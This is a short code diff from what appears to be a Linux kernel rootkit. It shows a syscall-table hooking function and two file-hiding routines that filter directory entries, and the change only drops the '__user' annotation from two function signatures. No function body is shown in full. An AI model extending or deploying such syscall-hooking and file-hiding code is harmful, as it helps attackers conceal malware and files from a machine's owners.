@@ -80,7 +80,7 @@ unsigned long ** hook_syscall_table(void)
  * @param bit : identify the bit size for OS
  * @return 
  */
-static long hide_file(char *f_name, struct linux_dirent __user *dirp, long count)
+static long hide_file(char *f_name, struct linux_dirent *dirp, long count)
 {
     struct linux_dirent *dp;
     long cur_addr, cur_reclen;
@@ -112,7 +112,7 @@ static long hide_file(char *f_name, struct linux_dirent __user *dirp, long count
  * @param count : the size of this structure
  * @return 
  */
-static long hide_file64(char *f_name, struct linux_dirent64 __user *dirp, long count)
+static long hide_file64(char *f_name, struct linux_dirent64 *dirp, long count)
 {
     struct linux_dirent64 *dp;
     long cur_addr, cur_reclen;
